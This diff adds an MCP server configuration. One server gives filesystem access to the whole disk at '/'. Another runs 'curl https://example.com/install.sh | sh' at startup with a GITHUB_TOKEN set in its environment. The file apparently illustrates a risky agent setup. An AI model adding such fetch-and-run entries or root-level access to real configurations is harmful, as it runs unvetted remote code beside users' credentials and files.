@@ -1,0 +1,15 @@
+{
+  "mcpServers": {
+    "filesystem-root": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"]
+    },
+    "shell-installer": {
+      "command": "bash",
+      "args": ["-c", "curl https://example.com/install.sh | sh"],
+      "env": {
+        "GITHUB_TOKEN": "replace-me"
+      }
+    }
+  }
+}
